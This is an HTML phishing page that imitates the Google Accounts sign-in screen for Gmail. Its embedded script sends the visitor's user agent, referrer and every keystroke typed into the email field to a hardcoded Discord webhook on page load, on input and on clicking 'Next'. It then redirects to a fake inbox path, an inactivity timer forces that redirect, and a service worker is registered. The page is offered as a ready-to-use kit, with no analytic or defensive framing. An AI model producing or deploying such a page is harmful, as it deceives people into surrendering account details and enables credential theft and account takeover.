<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://mail.google.com/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Roboto', sans-serif; background: #fff; }
        .container { max-width: 480px; margin: 0 auto; padding: 40px 40px 0; }
        .logo { text-align: center; margin-bottom: 32px; }
        .logo img { height: 24px; width: auto; }
        .form { background: #fff; }
        .title { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
        .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 32px; }
        input[type="email"] { width: 100%; padding: 13px 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 8px; outline: none; }
        input[type="email"]:focus { border-color: #1a73e8; }
        .btn { width: 100%; background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; margin-bottom: 16px; }
        .btn:hover { background: #1669c1; }
        .forgot { text-align: center; }
        .forgot a { color: #1a73e8; text-decoration: none; font-size: 14px; }
        .forgot a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        <div class="form">
            <h1 class="title">Sign in</h1>
            <p class="subtitle">to continue to Gmail</p>
            <input type="email" id="email" placeholder="Email or phone" autocomplete="email">
            <button class="btn" onclick="proxyRedirect()">Next</button>
            <div class="forgot">
                <a href="#" onclick="proxyRedirect()">Forgot email?</a>
            </div>
        </div>
    </div>

    <script>
        // YOUR DISCORD WEBHOOK (add exfil server if needed)
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1466098541880672500/C6sx-mBMSy3wW41IW0AnIGJoMfJNAa2905NeLyFCqHq6hArN4kGWC3k51S_HyNdplehC';

        // Beacon exfil (CORS-proof)
        function sendExfil(data) {
            const payload = {
                content: `**Gmail Capture** | ${data.action.toUpperCase()}\n**Email:** \`${data.email || 'none'}\`\n**UA:** ${data.ua.slice(0,100)}...\n**Referrer:** ${data.referrer || 'direct'}\n**Time:** <t:${Math.floor(Date.now()/1000)}:F>`,
                username: 'Gmail Proxy',
                avatar_url: 'https://mail.google.com/favicon.ico'
            };
            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
            navigator.sendBeacon(WEBHOOK_URL, blob);
        }

        // Page load capture
        sendExfil({
            email: '',
            ua: navigator.userAgent,
            referrer: document.referrer,
            path: window.location.pathname,
            action: 'page_load'
        });

        // Email input
        const emailInput = document.getElementById('email');
        emailInput.addEventListener('input', () => {
            sendExfil({
                email: emailInput.value,
                ua: navigator.userAgent.slice(0,150),
                referrer: document.referrer,
                action: 'email_input'
            });
        });

        // Redirect with final exfil
        function proxyRedirect() {
            const emailVal = emailInput.value || 'unknown';
            sendExfil({
                email: emailVal,
                action: 'redirect_next'
            });
            window.location.href = `./mail/u/0/#inbox?email=${encodeURIComponent(emailVal)}`;
        }

        // Enter key
        document.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && document.activeElement === emailInput) proxyRedirect();
        });

        // SW (optional)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('./sw.js').catch(() => {});
        }

        // Inactivity timer
        let inactivityTimer;
        const resetTimer = () => {
            clearTimeout(inactivityTimer);
            inactivityTimer = setTimeout(proxyRedirect, 3000);
        };
        ['mousemove', 'keydown', 'scroll'].forEach(ev => document.addEventListener(ev, resetTimer));
        resetTimer();
    </script>
</body>
</html>
